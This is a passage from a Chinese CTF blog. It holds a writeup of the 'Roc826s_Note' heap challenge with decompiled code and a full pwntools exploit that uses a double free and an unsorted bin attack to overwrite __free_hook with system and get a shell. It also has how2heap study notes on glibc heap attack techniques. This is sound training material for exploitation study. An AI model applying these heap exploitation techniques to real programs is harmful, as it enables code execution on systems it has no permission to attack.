<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>

<p>会发现就有一些数据适合让我们进行伪造，我们调好适当的偏移，让伪造的chunk的size位正好为<code>0x7f</code>就能通过检查，因为<code>0x7f</code>正好在<code>0x70</code>的范围内，并且<code>0x7f</code>的最低一位是1。</p>
<p>我们调整好偏移之后再来看一下：</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class>

<p>这样就完成了size位的伪造，我们就能成功在<code>__malloc_hook</code>附近申请出一个堆块，进而修改<code>__malloc_hook</code></p>
<p>这里还涉及到两个问题：</p>
<ul>
<li><p>在上面的例子中我们知道<code>__malloc_hook</code>附近是会有现有的数据能让我们完成size位的伪造的（目前只知道libc-2.23和libc-2.27会有，更高版本不知道还有没有），但是我们查看<code>__free_hook</code>附近，会发现什么都没有</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-6.jpg" class>

<p>这也就说明我们是无法直接在<code>__free_hook</code>附近得到一个<code>fast bin</code>大小的堆块的，我们得通过一些其他方法作为铺垫（例如unsorted bin attack），然后才能继续下一步</p>
</li>
<li><p><code>__malloc_hook</code>的参数是我们无法直接控制的（我目前的了解），也就是说我们要通过修改<code>__malloc_hook</code>来拿shell的话只能将其改成one_gadget或者后门函数，但是<code>__free_hook</code>的参数是我们可控的，其会将传进<code>free</code>函数的指针来作为第一个参数，也就是说我们只需要在chunk的数据区开头写入<code>/bin/sh</code>，修改<code>__free_hook</code>为<code>system</code>之后将这个chunk free掉即可。</p>
</li>
</ul>
</li>
<li><p>tcache虽然是单向链表，但是会将bk指针指向bin头，并且会<strong>通过这个指针来查找其所指向的整个bin链表中</strong>有无和这个bk指针所属的chunk相同的chunk，简单点说就是一个加强版的double free检查。绕过也很简单，只需要修改这个bk指针即可。</p>
</li>
</ol>
<h3 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h3><p>版本libc-2.23</p>
<p>还是菜单堆题，主要涉及函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.dele&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.show&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">19</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;<span class="built_in">list</span>)[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  v2 = readi(<span class="string">&quot;size?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">0x90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;<span class="built_in">list</span>)[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read_n((&amp;<span class="built_in">list</span>)[i], v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  v1 = readi(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;<span class="built_in">list</span>)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>((&amp;<span class="built_in">list</span>)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在dele()函数中存在uaf漏洞，因为没有单独的edit功能，所以需要构造double free来修改fd指针伪造堆块</p>
<p>因为限制申请的chunk最大大小为0x90，所以能直接利用unsorted bin来泄漏libc地址</p>
<p>思路：</p>
<ol>
<li>泄漏libc和heap</li>
<li>伪造chunk修改<code>__free_hook</code>/<code>__malloc_hook</code>即可</li>
</ol>
<h4 id="修改-malloc-hook"><a href="#修改-malloc-hook" class="headerlink" title="修改__malloc_hook"></a>修改__malloc_hook</h4><p>泄漏libc后构造一个double free来在<code>__malloc_hook</code>附近申请一个堆块即可</p>
<h4 id="修改-free-hook"><a href="#修改-free-hook" class="headerlink" title="修改__free_hook"></a>修改__free_hook</h4><p>改<code>__free_hook</code>要稍微麻烦点，可以先利用unsorted bin attack在<code>__free_hook</code>附近写入一个libc地址，这样就能让<code>__free_hook</code>附近有可用的能够用来伪造size位的数据了(0x7f)</p>
<p>具体一点：</p>
<ol>
<li>泄漏libc和heap</li>
<li>在unsorted bin chunk前面申请一个堆块，从而修改unsorted bin chunk的bk指针指向<code>__free_hook</code>附近</li>
<li>将这个unsorted bin chunk malloc出来，这个解链的过程中unsorted bin chunk就会将其<code>fd</code>的值写入<code>bk-&gt;fd</code>中，这样就使得<code>__free_hook</code>附近出现了可用的数据</li>
<li>再正常利用double free来伪造堆块从而修改<code>__free_hook</code>即可</li>
</ol>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./Roc826&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x71&#x27;</span>) <span class="comment">#这里申请一个跟unsorted bin chunk相邻的chunk，通过这个chunk来伪造unsorted bin chunk的size位</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;&#x27;</span>)	<span class="comment">#申请一个unsorted bin chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)	<span class="comment">#申请两个fast bin chunk实现double free</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f75f9240b78</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">sys = libc_base + (<span class="number">0x7f75f8ec13a0</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7fd4270557a8</span> - <span class="number">0x7fd426c8f000</span>)</span><br><span class="line">arena = libc_base + (<span class="number">0x7f6553094b78</span> - <span class="number">0x7f6552cd0000</span>)	<span class="comment">#这里的arena是指unsorted bin的bin头位置</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x130</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0x60</span>,p64(heap_base+<span class="number">0x20</span>))	<span class="comment">#这里伪造fd指针</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(arena) + p64(free_hook-<span class="number">0x40</span>))	<span class="comment">#这里修改unsorted bin chunk的bk指针</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#unsorted bin attack</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook-<span class="number">0x30</span>-<span class="number">3</span>))	<span class="comment">#这里开始再进行一次堆块的伪造即可</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span> + p64(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/17/how2heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/17/how2heap/" class="post-title-link" itemprop="url">how2heap</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-17 14:09:41" itemprop="dateCreated datePublished" datetime="2022-04-17T14:09:41+08:00">2022-04-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-12 01:17:23" itemprop="dateModified" datetime="2022-05-12T01:17:23+08:00">2022-05-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="How2heap"><a href="#How2heap" class="headerlink" title="How2heap"></a>How2heap</h2><p>这里记一下从how2heap中学习所得</p>
<h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h4><p>glibc使用第一契合算法来选择free chunk，就是如果程序在遍历bins链表的时候，如果找到一个free chunk足够大（也就是不小于用户需求），那么就会直接选择这个chunk来使用以此节省时间，而不是去遍历完所有的bin来寻找一个大小刚刚合适的chunk。</p>
<p>如果遍历完bins链表都没有能满足用户需求大小的chunk，则在Top chunk中划分一块给用户。</p>
<p>如果Top chunk的大小都不足以满足用户需求，则堆管理器再向系统申请内存，这里再分为：①申请的内存较小使用brk系统调用。②申请的内存较大使用mmap系统调用。</p>
<p>综上：用户在申请内存时，先根据大小决定在哪个bins中寻找chunk，如果该申请的内存大小不满足fast bins的范围，则在unsorted bin中寻找，在unsorted bin中寻找不到就会触发其合并机制，合并完后进行归类，归类完后在对应大小的small bins或large bins中继续寻找。再找不到就top chunk…..</p>
<p>只要在这个寻找的过程中找到了一个大于或等于用户申请需求的内存大小的chunk，则立刻停止寻找，这时这块chunk如果是大于申请需求的，则会进行划分，划分为刚好满足用户申请大小的chunk和剩余部分的chunk，这块剩余部分的chunk称为last remainder chunk，然后last remainder chunk会被填入相关控制字段，再重新进入unsorted bin中</p>
<h4 id="use-after-free（释放重利用）"><a href="#use-after-free（释放重利用）" class="headerlink" title="use-after-free（释放重利用）"></a>use-after-free（释放重利用）</h4><p>（unsorted bin为双向链表，下图中省略了结构）（指针类型和malloc的大小为例子）</p>
<p>① 依次执行 <code>char* a = malloc(0x512); char* b = malloc(0x256); free(a); </code></p>
<p>由以上步骤得到如下图结构：</p>
<img src="/2022/04/17/how2heap/use-after-free-1.jpg" class>

<p>在这里要注意的是：一、<code>free(a);</code>之后a所指向的chunk中的数据不会被抹除，仅仅只是将这块chunk标记为free chunk。二、指针a（也就是malloc返回的指针）也不会消失，仍然指向原来的区域</p>
<p>② <code>char* c = malloc(0x500);</code></p>
<p>由于glibc的first fit算法，<code>malloc(0x500);</code>所得到的chunk会是刚释放掉的那块chunk，此时指针a跟指针c指向的是同一个位置</p>
<img src="/2022/04/17/how2heap/use-after-free-2.png" class>

<p>综上操作就得到了两个指向相同位置的指针，打印a和c，都会得到相同的内容，即原本chunk中的数据部分的内容</p>
<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double-free"></a>Double-free</h4><p>fast bins会检查列入它的链表中的chunk的大小是否符合它此时fast bin所对应的大小，例如一个fast bin要存放的是0x20大小的chunk，则在一个free chunk在进入这个bin的链表之前会进行两个检查：(一) 要放进来的这个chunk是否与<strong>上一个</strong>放进来的chunk相同（也就是防止一个chunk被连续free两次）。(二) 要放进来的这个chunk的大小是否与这个bin的规定存放大小相等。程序正常运行时不会出现这种不相等的情况，但是设置这个检查就是为了防止恶意攻击。</p>
<p>fast bins的double free检查存在的缺陷是它只检查准备放进来的这个chunk是否与上一个chunk相同，而不会检查整个链表中是否有跟这个chunk相同的chunk，这种简单的检查设计也是同时在兼顾着fast bins的速度问题，如果加入一些繁杂的检查机制会导致拖慢fast bins的速度。所以只要在第二次free掉一个已经free掉的chunk前free掉另一个chunk就可以绕过double free检查。</p>
<p>① <code>int* a = malloc(8); int* b = malloc(8); int* c = malloc(8); </code></p>
<p>首先malloc三块符合fast bins的chunk</p>
<p>② <code>free(a); free(b); free(a);</code></p>
<p>然后让a指针所对应的chunk释放两次，因为double free检查的存在，所以中间先把b指针所对应的chunk给free掉。到目前为止就得到了如下的fast bins结构：</p>
<img src="/2022/04/17/how2heap/double-free-1.jpg" class>

<p>③ <code>int* d = malloc(8); malloc(8);</code></p>
<p>用指针d接收第二次被free掉的那块chunk，然后再malloc一次把中间的那块chunk去掉</p>
<img src="/2022/04/17/how2heap/double-free-2.png" class>

<p>到这里为止我们发现fast bins的指针跟指针d都指向了同一块chunk</p>
<p>对于d的指针来说，a是一块malloced chunk，所以d的指针认为它所指的位置是数据体部分，可以往里任意写入数据，但在fast bin中的a是一块free chunk，a的数据体部分的第一个字长用作fd指针，所以d的指针可以通过写入数据来使fast bin中的a的fd指针指向任意位置。</p>
<p>④ 通过d的指针将a的fd指针修改为栈上的一块内存</p>
<p>因为在bin的链表中仅仅依靠指针来寻找和确定有无下一个chunk，所以修改fd指针后fast bin中就相当于多出了一个chunk，如下图：</p>
<img src="/2022/04/17/how2heap/double-free-3.png" class>

<img src="/2022/04/17/how2heap/double-free-4.png" class>

<p>注意fd指针和堆返回的指针指向不同。应使要修改的栈上的值在fd指针下面两个字节处。</p>
<h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted-bin-attack"></a>unsorted-bin-attack</h4><p>该攻击能达到的效果是向任意地址写入一个较大的数字，前提是能控制bk的值。</p>
<p>该攻击虽然能向任意地址写，但不能控制写入的值，一般是作为其他攻击的铺垫。</p>
<p>fast bins在32位平台中存放的chunk的大小在16-64之间，但这个限制实际上是由arena中的一个控制字段控制的，所以如果利用unsorted bin attack将这个控制字段修改，就能修改存放在fast bins中的chunk大小的限制，使得所有chunk被free掉之后都存入fast bins中，再结合fast bins的攻击达到控制程序执行流等目的。</p>
<p>首先要了解从unsorted bin中取出一个chunk的流程</p>
<p>下图是unsorted bin的结构</p>
<img src="/2022/04/17/how2heap/unsorted-bin-attack-1.jpg" class>

<p>当从unsorted bin从取出一个chunk（这里称为chunk1）时，为了保证unsorted bin的双向链表结构的完整，程序会修改unsorted bin表头的fd指针和被取出的chunk指向的下一块chunk（这里称为chunk2）的bk指针。</p>
<p>那么如何将unsorted bin表头的fd指针和chunk2的bk指针修改为正确的值呢？显然这两个对应的值储存在chunk1的fd指针和bk指针中，所以此时unsorted bin表头的fd指针就会填上chunk1的fd指针的值，chunk2的bk指针就会填上chunk1的bk指针的值。</p>
<p>最后形成如下结构</p>
<img src="/2022/04/17/how2heap/unsorted-bin-attack-2.jpg" class>

<p>由上过程我们可以发现，如果我们能够控制chunk1的fd指针的值，那么就相当于我们能够让任意地址作为chunk2，且在chunk1被取出的时候，程序就会自动向chunk2的对应位置中写入unsorted bin表头的所在地址，对于主进程来说，这个地址位于libc的数据段中，所以会是一个比较大的值。综上我们就完成了一个较大值的任意地址写。</p>
<h4 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h4><p>需要：堆溢出</p>
<p>通过堆溢出将top chunk的size控制字段修改成一个极大的数字，这是为了避免堆管理器在后面用mmap()系统调用来申请内存，以及让之后的内存申请都在top chunk中发生。</p>
<img src="/2022/04/17/how2heap/house_of_force-1.jpg" class>

<p>例如想修改栈上的一个值，我们第一次先malloc一个很大的空间，大到把栈的一部分也作为这块chunk的一部分，这块malloc的空间就会从top chunk当前的起始位置一直往内存的高地址划分，直到达到我们指定的大小，然后我们第二次再malloc一块chunk，那么这块chunk就会直接在栈上，此时我们就实现了往栈上写数据。</p>
<p>而且如果我们malloc一个负数，那么就会在此时top chunk低地址处得到一块chunk（这是因为malloc的参数是无符号类型整数，所以我们传进一个负数的话会被解释成无符号类型整数，从而发生整数溢出，最后会得到从此时top chunk起始地址往低地址的一块对应大小的chunk），我们就可以用这种方式去修改程序段的某个地址的值。</p>
<h4 id="house-of-einherjar-libc-2-23"><a href="#house-of-einherjar-libc-2-23" class="headerlink" title="house_of_einherjar(libc-2.23)"></a>house_of_einherjar(libc-2.23)</h4><p>（还没搞懂）</p>
<p>条件：off-by-one、泄漏heap地址</p>
<p>该攻击实现的是任意地址分配chunk</p>
<h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h4><p>（还没搞懂）</p>
<p>很好的博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/happylzs2008/article/details/103879620">借助gdb调试glibc代码学习House of Orange_happylzs2008的博客-CSDN博客</a></p>
<p>使用场景：程序中没有包含free函数或者其他释放堆块的函数时，利用该漏洞获得free的效果</p>
<p>条件：</p>
<ol>
<li>能够修改top chunk的size位</li>
<li>伪造top chunk的size必须对齐到内存页（0x1000个字节），意思就是top chunk的起始地址加上top chunk的size必须是0x1000的倍数</li>
<li>伪造的这个size必须大于最小chunk的大小，同时小于之后要申请的内存</li>
<li>inuse位必须为1</li>
</ol>
<p>原理：</p>
<ol>
<li><p>当现有的top chunk都不足以满足malloc的分配需求时，系统会执行sysmalloc来向系统申请更多空间，在该函数中，其会根据我们申请的大小决定用mmap分配还是brk分配。我们需要让堆以brk的形式拓展，因为用mmap进行拓展时不会将原本的top chunk free掉，这个过程中首先会在原来的top chunk的上方拓展一块空间作为新的top chunk，然后会把原来的top chunk free掉，这样旧top chunk就进入了unsorted bin中。</p>
</li>
<li></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/14/pwnable-tw-calc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/14/pwnable-tw-calc/" class="post-title-link" itemprop="url">pwnable.tw-calc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-14 14:54:20" itemprop="dateCreated datePublished" datetime="2022-04-14T14:54:20+08:00">2022-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-15 15:35:11" itemprop="dateModified" datetime="2022-04-15T15:35:11+08:00">2022-04-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>感觉这题主要考察代码审计能力，比起其他套路化的pwn题，这题的漏洞和利用要难找许多</p>
<p>main函数如下：</p>
